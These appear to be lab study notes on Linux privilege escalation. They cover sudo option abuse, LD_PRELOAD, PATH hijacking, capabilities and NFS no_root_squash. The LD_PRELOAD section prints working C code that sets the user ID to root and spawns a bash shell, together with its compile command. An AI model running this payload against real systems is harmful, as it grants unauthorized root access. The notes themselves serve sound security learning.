### Leverage Application Functions

Sometimes a program allowed through ``sudo`` does not have a simple shell feature, but one of its **built-in options can be abused**.

Check:

`-f`: which means Apache can load an alternative configuration file.


Then run this:

``Allowed program through sudo`` -> ``Find an interesting built-in option`` -> ``Use the option with a sensitive file`` -> ``Information may be exposed``

> A program does not need to be directly vulnerable; one of its normal functions may create a privilege-escalation opportunity.


### Leverage LD_PRELOAD
``LD_PRELOAD`` is a Linux environment variable that can make a program load a specified shared library (``.so``) before other libraries.


<img width="1806" height="197" alt="image" src="https://github.com/user-attachments/assets/1e9f3da5-3a3f-4870-a553-083796659760" />


This means the ``LD_PRELOAD`` environment variable can remain available when using ``sudo``.

The steps of this privilege escalation vector can be summarized as follows:
1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a shared object (.so extension) file
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file


Create the Shared Library
````
nano shell.c
````
````shell
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
````
<img width="1184" height="338" alt="image" src="https://github.com/user-attachments/assets/564cecdd-cc44-4ba9-a867-7289a56eb239" />


To save it just press `Ctrl + O` -> `Enter` -> `Ctrl + X`.

Compile it:
````
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
````

### PATH Hijacking

**PATH** is an environment variable that tells Linux which directories to search when we run a command without its full path.


````
echo $PATH
````
<img width="1207" height="103" alt="image" src="https://github.com/user-attachments/assets/5dd38f03-d567-4650-8090-9fec04ba60e9" />


##### Why write permission matters

Suppose ``$PATH`` contains:
````
/usr/local/bin
/usr/bin
````

and our user can write to ``/usr/local/bin``.

If a privileged script executes: ``thm``

instead of:
````
/usr/bin/thm
````

then ``/usr/local/bin`` gets searched first.

Conceptually:
````
Privileged script
      |
      | runs "thm"
      v
    $PATH
      |
      +-- /usr/local/bin/thm   ← attacker-controlled
      |
      +-- /usr/bin/thm
````
That is the PATH hijacking opportunity.



#### The four questions in the lesson

| Question                                         | What you're checking                                         |
| ------------------------------------------------ | ------------------------------------------------------------ |
| **1. What directories are under `$PATH`?**       | Find where Linux searches for commands                       |
| **2. Can our user write to any?**               | Look for a writable PATH directory                           |
| **3. Can we modify `$PATH`?**                   | Determine whether we can change the search order            |
| **4. Is there a vulnerable script/application?** | Find a program that runs a command without its absolute path |

### Linux Capabilities

**Capabilities** give a program specific privileges without giving the whole program full root access. This is more granular than simply making a user root.

``Normal User`` -> ``Runs a program with special capability`` -> ``Program gets specific privileged action``

### NFS Privilege Escalation

Find an NFS share that is writable and has ``no_root_squash`` → mount it → create a root-owned SUID program → run it on the target → get root.


What is NFS?
| Item                       | Easy explanation                                                                         |
| -------------------------- | ---------------------------------------------------------------------------------------- |
| **NFS**                    | Network File System; allows one Linux machine to share directories with another machine. |
| `/etc/exports`             | NFS server configuration file that shows which directories are shared.                   |
| `rw`                       | The share can be read and written to.                                                    |
| `no_root_squash`           | Root from the NFS client is not changed to `nfsnobody`.                                  |
| **SUID**                   | A program runs with the privileges of its file owner.                                    |
| `root:root`                | The file is owned by root.                                                               |
| **Vulnerable combination** | `rw` + `no_root_squash` can allow a root-owned SUID executable to be created.            |

## Task 8: Conclusion


| Privilege Escalation Vector | Easy Meaning                                                                            | Key Point                                 |
| --------------------------- | --------------------------------------------------------------------------------------- | ----------------------------------------- |
| **Sudo**                    | Abuse overly permissive sudo rules to run commands as another user/root.                | Check `sudo -l`                           |
| **SUID**                    | Find binaries that execute with their owner's privileges and abuse them to get a shell. | Look for root-owned SUID files            |
| **PATH Hijacking**          | Manipulate `$PATH` so a privileged program runs an attacker-controlled binary.          | Check writable PATH directories           |
| **Linux Capabilities**      | Abuse powerful capabilities assigned to executables.                                    | Check with `getcap -r / 2>/dev/null`      |
| **Writable Cron Jobs**      | Modify a script or command that is automatically executed as root.                      | Check root cron jobs and file permissions |
| **NFS Misconfiguration**    | Abuse a writable NFS share with `no_root_squash` to create a root-owned SUID binary.    | Look for `rw` + `no_root_squash`          |
